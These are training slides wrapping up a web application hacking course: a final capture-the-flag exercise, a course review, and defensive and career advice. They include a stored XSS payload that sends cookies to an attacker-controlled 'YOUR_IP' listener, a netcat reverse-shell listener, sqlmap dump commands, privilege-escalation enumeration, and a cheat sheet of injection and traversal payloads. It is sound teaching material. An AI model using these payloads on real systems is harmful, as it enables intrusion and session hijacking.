# Final CTF Exercise & Course Wrap-Up

## Applying Everything You Have Learned

---

## CTF Overview

**Capture The Flag** - A hands-on exercise testing all skills learned:

- Multiple challenges of varying difficulty
- Each challenge contains a hidden flag
- Flags follow the format: `FLAG{description_here}`
- Time limit: 3 hours
- Work individually or in pairs
- Hints available (but cost points!)

---

## CTF Challenge Categories

| Category | Points | Skills Tested |
|----------|--------|--------------|
| **Reconnaissance** | 100 | Scanning, enumeration |
| **Web Exploitation** | 200 | SQLi, XSS, LFI |
| **Authentication** | 200 | Brute-force, bypass |
| **Privilege Escalation** | 300 | Post-exploitation |
| **Logic Flaws** | 200 | Business logic abuse |
| **Bonus** | 100 | Creative exploitation |

Total: **1100 points** available

---

## CTF Tips & Strategy

```misc
1. READ the challenge description carefully
2. Start with LOW-hanging fruit (easy challenges)
3. Take NOTES on everything you try
4. Don't get stuck - move to another challenge
5. Use your TOOLS (don't try to do everything manually)
6. Check for COMMON misconfigurations first
7. Think OUTSIDE the box for logic challenges
8. DOCUMENT your steps (needed for the report)

Time Management:
  First 30 min:  Scan everything, get the big picture
  Next 90 min:   Work through challenges systematically
  Last 60 min:   Focus on remaining flags + documentation
```

---

## CTF Methodology Reminder

<svg xmlns="http://www.w3.org/2000/svg" width="460" height="330" font-family="sans-serif">
  <defs>
    <marker id="arw4" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555"/>
    </marker>
  </defs>
  <rect x="1" y="1" width="458" height="328" rx="4" fill="#fff" stroke="#333" stroke-width="1"/>
  <!-- Phase 1: Reconnaissance -->
  <rect x="80" y="10" width="300" height="80" rx="4" fill="#e3f2fd" stroke="#1565c0" stroke-width="1.5"/>
  <text x="230" y="32" font-size="13" font-weight="bold" fill="#1565c0" text-anchor="middle">Reconnaissance</text>
  <text x="230" y="50" font-size="12" fill="#333" text-anchor="middle">nmap full scan &#8226; Directory brute force</text>
  <text x="230" y="66" font-size="12" fill="#333" text-anchor="middle">Technology identification</text>
  <!-- Arrow 1 -->
  <line x1="230" y1="90" x2="230" y2="110" stroke="#555" stroke-width="1.5" marker-end="url(#arw4)"/>
  <!-- Phase 2: Test Entry Points -->
  <rect x="80" y="110" width="300" height="90" rx="4" fill="#fff3e0" stroke="#e65100" stroke-width="1.5"/>
  <text x="230" y="132" font-size="13" font-weight="bold" fill="#e65100" text-anchor="middle">Test Entry Points</text>
  <text x="230" y="150" font-size="12" fill="#333" text-anchor="middle">SQL injection &#8226; XSS &#8226; Command injection</text>
  <text x="230" y="166" font-size="12" fill="#333" text-anchor="middle">File inclusion &#8226; Auth bypass</text>
  <text x="230" y="182" font-size="12" fill="#333" text-anchor="middle">Path traversal &#8226; SSRF</text>
  <!-- Arrow 2 -->
  <line x1="230" y1="200" x2="230" y2="220" stroke="#555" stroke-width="1.5" marker-end="url(#arw4)"/>
  <!-- Phase 3: Exploit & Escalate -->
  <rect x="80" y="220" width="300" height="90" rx="4" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="230" y="242" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Exploit &amp; Escalate</text>
  <text x="230" y="260" font-size="12" fill="#333" text-anchor="middle">Get initial shell &#8226; Find credentials</text>
  <text x="230" y="276" font-size="12" fill="#333" text-anchor="middle">Escalate to root</text>
  <text x="230" y="292" font-size="12" fill="#2e7d32" font-weight="bold" text-anchor="middle">&#127989; Read the flag!</text>
</svg>

---

## Challenge 1: Reconnaissance (100 pts)

**Objective**: Find the hidden flag on the web server

Hints:
- Not all content is linked from the main page
- Check common files and directories
- Some files are meant to be hidden but aren't

```bash
# Tools to use:
gobuster dir -u http://TARGET -w common.txt -x txt,html,bak
curl http://TARGET/robots.txt
curl http://TARGET/.git/HEAD
```

---

## Challenge 2: SQL Injection (200 pts)

**Objective**: Extract the admin password from the database

Steps:
1. Find the injectable parameter
2. Determine the database type
3. Enumerate tables and columns
4. Extract the flag from the `flags` table

```bash
# Start testing
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" --batch -D ctfdb -T flags --dump
```

---

## Challenge 3: XSS (200 pts)

**Objective**: Steal the admin's cookie via stored XSS

Steps:
1. Find a page that stores and displays user input
2. Craft an `XSS` payload that sends cookies to your server
3. Trigger the admin bot to visit the page
4. Capture the admin's session cookie
5. Use the cookie to access the admin panel
6. Find the flag in the admin panel

```bash
# Start a listener
python3 -m http.server 8888

# XSS payload
<script>new Image().src='http://YOUR_IP:8888/?c='+document.cookie</script>
```

---

## Challenge 4: Authentication Bypass (200 pts)

**Objective**: Log in as admin without knowing the password

Possible attack vectors:
- `SQL injection` in login form
- Weak password / default credentials
- Password reset vulnerability
- `JWT` manipulation
- Authentication logic flaw

---

## Challenge 5: Privilege Escalation (300 pts)

**Objective**: Get root access and read `/root/flag.txt`

Steps:
1. Get initial access via web exploitation
2. Enumerate the system
3. Find a privilege escalation vector
4. Escalate to root
5. Read the flag

```bash
# After getting a shell:
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
./linpeas.sh
```

---

## Challenge 6: Logic Flaw (200 pts)

**Objective**: Purchase an item for free (or negative price)

Possible attack vectors:
- Price manipulation in requests
- Coupon/discount abuse
- Quantity manipulation
- Race condition on payment
- Workflow bypass

---

## Challenge 7: Bonus (100 pts)

**Objective**: Find the hidden flag using any creative method

This challenge requires thinking outside the box.
No specific hints - use everything you've learned!

---

## CTF Scoring

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="210" font-family="sans-serif">
  <rect x="1" y="1" width="658" height="208" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="658" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">CTF Scoreboard</text>
  <!-- Table header -->
  <rect x="14" y="44" width="630" height="28" rx="2" fill="#1565c0"/>
  <text x="60" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Team</text>
  <text x="138" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 1</text>
  <text x="196" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 2</text>
  <text x="254" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 3</text>
  <text x="312" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 4</text>
  <text x="370" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 5</text>
  <text x="428" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 6</text>
  <text x="486" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Ch 7</text>
  <text x="570" y="63" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Total</text>
  <!-- Row 1: Team A -->
  <rect x="14" y="72" width="630" height="28" rx="0" fill="#f5f5f5"/>
  <text x="60" y="91" font-size="12" fill="#333" text-anchor="middle">Team A</text>
  <text x="138" y="91" font-size="12" fill="#333" text-anchor="middle">100</text>
  <text x="196" y="91" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="254" y="91" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="312" y="91" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="370" y="91" font-size="12" fill="#333" text-anchor="middle">300</text>
  <text x="428" y="91" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="486" y="91" font-size="12" fill="#333" text-anchor="middle">100</text>
  <text x="570" y="91" font-size="12" font-weight="bold" fill="#1b5e20" text-anchor="middle">1300</text>
  <!-- Row 2: Team B -->
  <rect x="14" y="100" width="630" height="28" rx="0" fill="#fff"/>
  <text x="60" y="119" font-size="12" fill="#333" text-anchor="middle">Team B</text>
  <text x="138" y="119" font-size="12" fill="#333" text-anchor="middle">100</text>
  <text x="196" y="119" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="254" y="119" font-size="12" fill="#555" text-anchor="middle">0</text>
  <text x="312" y="119" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="370" y="119" font-size="12" fill="#333" text-anchor="middle">300</text>
  <text x="428" y="119" font-size="12" fill="#555" text-anchor="middle">0</text>
  <text x="486" y="119" font-size="12" fill="#555" text-anchor="middle">0</text>
  <text x="570" y="119" font-size="12" font-weight="bold" fill="#333" text-anchor="middle">800</text>
  <!-- Row 3: Team C -->
  <rect x="14" y="128" width="630" height="28" rx="0" fill="#f5f5f5"/>
  <text x="60" y="147" font-size="12" fill="#333" text-anchor="middle">Team C</text>
  <text x="138" y="147" font-size="12" fill="#333" text-anchor="middle">100</text>
  <text x="196" y="147" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="254" y="147" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="312" y="147" font-size="12" fill="#555" text-anchor="middle">0</text>
  <text x="370" y="147" font-size="12" fill="#555" text-anchor="middle">0</text>
  <text x="428" y="147" font-size="12" fill="#333" text-anchor="middle">200</text>
  <text x="486" y="147" font-size="12" fill="#333" text-anchor="middle">100</text>
  <text x="570" y="147" font-size="12" font-weight="bold" fill="#333" text-anchor="middle">800</text>
  <!-- Bonus notes -->
  <text x="14" y="174" font-size="12" fill="#2e7d32">+50  First team to solve a challenge</text>
  <text x="14" y="190" font-size="12" fill="#2e7d32">+25  Clean documentation / writeup</text>
  <text x="300" y="174" font-size="12" fill="#c62828">&#8722;25  Per hint used</text>
</svg>

---

## CTF Report Template

```markdown
# CTF Report - [Team Name]

## Challenge: [Name]
**Points**: [X]
**Category**: [Category]

### Discovery
How I found the vulnerability...

### Exploitation
Step-by-step exploitation:
1. First I...
2. Then I...

### Evidence
[Screenshots, command output, flag value]

### Remediation
How this vulnerability should be fixed:
- ...

### Flag
FLAG{the_flag_value}
```

---

## CTF Common Pitfalls

```misc
Things that waste time in CTFs:

1. Not reading the challenge description carefully
   - Hints are often embedded in the description

2. Overthinking simple challenges
   - Try the obvious first (admin:admin, robots.txt)

3. Not checking all ports
   - Always do a full port scan first

4. Forgetting to check page source
   - Comments, hidden fields, JavaScript variables

5. Not trying multiple injection points
   - Headers, cookies, ALL parameters

6. Tool misconfiguration
   - Wrong wordlist, missing cookies, wrong proxy

7. Not taking notes
   - Forget what you already tried
   - Can't reproduce findings

8. Tunnel vision
   - Stuck on one approach? Try something different
```

---

## Essential CTF One-Liners

```bash
# Quick port scan
nmap -sV -sC -p- --min-rate 5000 TARGET

# Find hidden content fast
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Quick SQL injection test
sqlmap -u "http://TARGET/page?id=1" --batch --dbs

# Find all subdomains from cert transparency
curl -s "https://crt.sh/?q=%.TARGET.com&output=json" | jq -r '.[].name_value' | sort -u

# Reverse shell listener
nc -lvnp 4444

# Crack common hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Download file from target
curl http://TARGET/file -o file
wget http://TARGET/file

# Spawn TTY after getting shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Vulnerability Cheat Sheet Summary

<svg xmlns="http://www.w3.org/2000/svg" width="680" height="340" font-family="sans-serif">
  <rect x="1" y="1" width="678" height="338" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="678" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="340" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">Vulnerability Quick Reference</text>
  <!-- Column headers -->
  <rect x="14" y="44" width="650" height="26" rx="2" fill="#1565c0"/>
  <text x="118" y="62" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Vulnerability</text>
  <text x="340" y="62" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Test Payload</text>
  <text x="556" y="62" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Defense</text>
  <!-- Grid lines -->
  <line x1="230" y1="44" x2="230" y2="338" stroke="#ccc" stroke-width="1"/>
  <line x1="450" y1="44" x2="450" y2="338" stroke="#ccc" stroke-width="1"/>
  <!-- Rows -->
  <rect x="14" y="70" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="85" font-size="11" fill="#333">SQL Injection</text>
  <text x="238" y="85" font-size="11" fill="#333" font-family="monospace">' OR 1=1--</text>
  <text x="458" y="85" font-size="11" fill="#333">Parameterized queries</text>

  <rect x="14" y="92" width="650" height="22" fill="#fff"/>
  <text x="22" y="107" font-size="11" fill="#333">XSS (Reflected)</text>
  <text x="238" y="107" font-size="11" fill="#333" font-family="monospace">&lt;script&gt;alert(1)</text>
  <text x="458" y="107" font-size="11" fill="#333">Output encoding</text>

  <rect x="14" y="114" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="129" font-size="11" fill="#333">XSS (Stored)</text>
  <text x="238" y="129" font-size="11" fill="#333" font-family="monospace">&lt;img onerror=...</text>
  <text x="458" y="129" font-size="11" fill="#333">HTML sanitization</text>

  <rect x="14" y="136" width="650" height="22" fill="#fff"/>
  <text x="22" y="151" font-size="11" fill="#333">Command Injection</text>
  <text x="238" y="151" font-size="11" fill="#333" font-family="monospace">;whoami</text>
  <text x="458" y="151" font-size="11" fill="#333">No shell calls; allowlist</text>

  <rect x="14" y="158" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="173" font-size="11" fill="#333">Path Traversal</text>
  <text x="238" y="173" font-size="11" fill="#333" font-family="monospace">../../../etc/passwd</text>
  <text x="458" y="173" font-size="11" fill="#333">Whitelist paths</text>

  <rect x="14" y="180" width="650" height="22" fill="#fff"/>
  <text x="22" y="195" font-size="11" fill="#333">LFI</text>
  <text x="238" y="195" font-size="11" fill="#333" font-family="monospace">php://filter/...</text>
  <text x="458" y="195" font-size="11" fill="#333">Whitelist includes</text>

  <rect x="14" y="202" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="217" font-size="11" fill="#333">SSRF</text>
  <text x="238" y="217" font-size="11" fill="#333" font-family="monospace">http://127.0.0.1</text>
  <text x="458" y="217" font-size="11" fill="#333">URL validation / allowlist</text>

  <rect x="14" y="224" width="650" height="22" fill="#fff"/>
  <text x="22" y="239" font-size="11" fill="#333">XXE</text>
  <text x="238" y="239" font-size="11" fill="#333" font-family="monospace">&lt;!ENTITY xxe SYSTEM</text>
  <text x="458" y="239" font-size="11" fill="#333">Disable XML entities</text>

  <rect x="14" y="246" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="261" font-size="11" fill="#333">IDOR</text>
  <text x="238" y="261" font-size="11" fill="#333" font-family="monospace">Change /user/123</text>
  <text x="458" y="261" font-size="11" fill="#333">Auth checks on all resources</text>

  <rect x="14" y="268" width="650" height="22" fill="#fff"/>
  <text x="22" y="283" font-size="11" fill="#333">CSRF</text>
  <text x="238" y="283" font-size="11" fill="#333">Auto-submit form</text>
  <text x="458" y="283" font-size="11" fill="#333">CSRF tokens</text>

  <rect x="14" y="290" width="650" height="22" fill="#f5f5f5"/>
  <text x="22" y="305" font-size="11" fill="#333">Deserialization</text>
  <text x="238" y="305" font-size="11" fill="#333">Crafted object</text>
  <text x="458" y="305" font-size="11" fill="#333">Use JSON; avoid native deser.</text>

  <rect x="14" y="312" width="650" height="22" fill="#fff"/>
  <text x="22" y="327" font-size="11" fill="#333">Auth Bypass</text>
  <text x="238" y="327" font-size="11" fill="#333" font-family="monospace">admin'--</text>
  <text x="458" y="327" font-size="11" fill="#333">Parameterized queries</text>
</svg>

---

## Course Review: Day 1

Web Application (In)security & Mapping - Key takeaways:
- Web applications are the #1 attack vector
- Technology stack identification guides testing
- Burp Suite is the essential testing tool
- Content discovery finds hidden attack surface
- Every input is a potential entry point
- Systematic mapping beats random testing

---

## Course Review: Day 2

Authentication & Session Attacks + SQL Injection Basics - Key takeaways:
- Authentication flaws enable account takeover
- Password spraying and credential stuffing are effective
- Session management requires cryptographic randomness
- `CSRF` tokens prevent cross-site request forgery
- `SQL injection` remains the most impactful web vulnerability
- Parameterized queries are the primary defense

---

## Course Review: Day 3

Advanced SQL Injection & XSS - Key takeaways:
- `UNION`-based, blind, and time-based `SQL injection` techniques
- `sqlmap` automates detection and exploitation
- Filter bypass requires creative encoding
- Second-order injection is harder to detect
- `XSS` executes code in the victim's browser
- Context-aware output encoding prevents `XSS`
- `CSP` provides defense-in-depth

---

## Course Review: Day 4

Back-End Attacks, Logic Flaws & Hardening - Key takeaways:
- OS command injection gives full system access
- File path attacks read/write arbitrary files
- Deserialization is extremely dangerous
- Logic flaws require manual discovery
- Server hardening reduces the attack surface
- Defense in depth across all layers
- Logging and monitoring detect attacks

---

## Course Review: Day 5

Boot2Root & CTF - Key takeaways:
- Systematic methodology from scanning to root
- Chain multiple vulnerabilities for full compromise
- Privilege escalation exploits misconfigurations
- Persistence and pivoting extend access
- Documentation is critical for reporting
- CTF exercises test real-world skills

---

## Top 10 Defensive Recommendations

```misc
1.  Use parameterized queries for ALL database access
2.  Implement context-aware output encoding (XSS prevention)
3.  Enforce multi-factor authentication
4.  Apply the principle of least privilege everywhere
5.  Keep all software updated and patched
6.  Implement Content Security Policy headers
7.  Use Web Application Firewall as defense layer
8.  Enable comprehensive logging and monitoring
9.  Conduct regular penetration testing
10. Train developers in secure coding practices
```

---

## Security Testing Workflow - Summary

<svg xmlns="http://www.w3.org/2000/svg" width="500" height="520" font-family="sans-serif">
  <defs>
    <marker id="arw5" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555"/>
    </marker>
  </defs>
  <rect x="1" y="1" width="498" height="518" rx="4" fill="#fff" stroke="#333" stroke-width="1"/>
  <!-- Phase 1 -->
  <rect x="80" y="10" width="340" height="78" rx="4" fill="#e3f2fd" stroke="#1565c0" stroke-width="1.5"/>
  <text x="250" y="30" font-size="13" font-weight="bold" fill="#1565c0" text-anchor="middle">Planning Phase</text>
  <text x="250" y="48" font-size="12" fill="#333" text-anchor="middle">Define scope &amp; rules of engagement</text>
  <text x="250" y="64" font-size="12" fill="#333" text-anchor="middle">Get written authorization &#8226; Set up tools &amp; env</text>
  <!-- Arrow -->
  <line x1="250" y1="88" x2="250" y2="104" stroke="#555" stroke-width="1.5" marker-end="url(#arw5)"/>
  <!-- Phase 2 -->
  <rect x="80" y="104" width="340" height="78" rx="4" fill="#fff3e0" stroke="#e65100" stroke-width="1.5"/>
  <text x="250" y="124" font-size="13" font-weight="bold" fill="#e65100" text-anchor="middle">Discovery Phase</text>
  <text x="250" y="142" font-size="12" fill="#333" text-anchor="middle">Network scanning &#8226; Web spidering</text>
  <text x="250" y="158" font-size="12" fill="#333" text-anchor="middle">Content discovery &#8226; Technology fingerprinting</text>
  <!-- Arrow -->
  <line x1="250" y1="182" x2="250" y2="198" stroke="#555" stroke-width="1.5" marker-end="url(#arw5)"/>
  <!-- Phase 3 -->
  <rect x="80" y="198" width="340" height="78" rx="4" fill="#fce4ec" stroke="#c62828" stroke-width="1.5"/>
  <text x="250" y="218" font-size="13" font-weight="bold" fill="#c62828" text-anchor="middle">Assessment Phase</text>
  <text x="250" y="236" font-size="12" fill="#333" text-anchor="middle">Injection &#8226; Auth/session testing</text>
  <text x="250" y="252" font-size="12" fill="#333" text-anchor="middle">Logic flaws &#8226; Configuration review</text>
  <!-- Arrow -->
  <line x1="250" y1="276" x2="250" y2="292" stroke="#555" stroke-width="1.5" marker-end="url(#arw5)"/>
  <!-- Phase 4 -->
  <rect x="80" y="292" width="340" height="78" rx="4" fill="#ffccbc" stroke="#bf360c" stroke-width="1.5"/>
  <text x="250" y="312" font-size="13" font-weight="bold" fill="#bf360c" text-anchor="middle">Exploitation Phase</text>
  <text x="250" y="330" font-size="12" fill="#333" text-anchor="middle">Confirm vulnerabilities &#8226; Demonstrate impact</text>
  <text x="250" y="346" font-size="12" fill="#333" text-anchor="middle">Privilege escalation</text>
  <!-- Arrow -->
  <line x1="250" y1="370" x2="250" y2="386" stroke="#555" stroke-width="1.5" marker-end="url(#arw5)"/>
  <!-- Phase 5 -->
  <rect x="80" y="386" width="340" height="78" rx="4" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="250" y="406" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Reporting Phase</text>
  <text x="250" y="424" font-size="12" fill="#333" text-anchor="middle">Document findings &#8226; Prioritize by risk</text>
  <text x="250" y="440" font-size="12" fill="#333" text-anchor="middle">Recommend fixes &#8226; Present to stakeholders</text>
</svg>

---

## Continuing Your Learning

| Resource | Type | Focus |
|----------|------|-------|
| **PortSwigger Web Security Academy** | Free labs | Web vulnerabilities |
| **HackTheBox** | Platform | Realistic machines |
| **TryHackMe** | Platform | Guided learning |
| **OWASP Testing Guide** | Documentation | Methodology |
| **PentesterLab** | Exercises | Specific techniques |
| **Bug Bounty Programs** | Real-world | Production apps |

---

## Certifications Path

```misc
Entry Level:
  CompTIA Security+
  eJPT (eLearnSecurity)

Intermediate:
  CEH (Certified Ethical Hacker)
  CompTIA PenTest+
  eWPT (Web App Pentesting)

Advanced:
  OSCP (Offensive Security)
  GWAPT (GIAC Web App Pentester)
  eWPTX (Advanced Web App Pentesting)

Expert:
  OSWE (Web Expert)
  OSCE3 (Offensive Security)
  GXPN (GIAC Exploit Researcher)
```

---

## Professional Pentesting Reporting

```misc
Executive Summary:
  - Overall risk rating
  - Key findings (3-5 bullet points)
  - Business impact assessment

Technical Findings:
  For each vulnerability:
  - Title and severity (CVSS score)
  - Description
  - Affected components
  - Steps to reproduce
  - Evidence (screenshots, requests/responses)
  - Impact analysis
  - Remediation recommendations

Methodology:
  - Tools used
  - Testing approach
  - Scope and limitations

Appendices:
  - Full scan results
  - Raw data
  - Remediation priority matrix
```

---

## Final Thoughts

- **Authorization first** - Never test without written permission
- **Think like an attacker** - But act like a professional
- **Defense is the goal** - We break things to make them stronger
- **Stay current** - New vulnerabilities emerge constantly
- **Practice regularly** - Skills deteriorate without practice
- **Share knowledge** - Help others learn to build a safer web
- **Be ethical** - The trust placed in pentesters is sacred

---

## Thank You

### Web Application Hacking Course Complete

Key skills acquired:
- Web application reconnaissance and mapping
- Authentication and session attack techniques
- `SQL injection` detection and exploitation
- `XSS` discovery and exploitation
- Back-end attack techniques
- Privilege escalation methodology
- Server hardening best practices
- Professional reporting

> Keep practicing, stay curious, and hack responsibly.
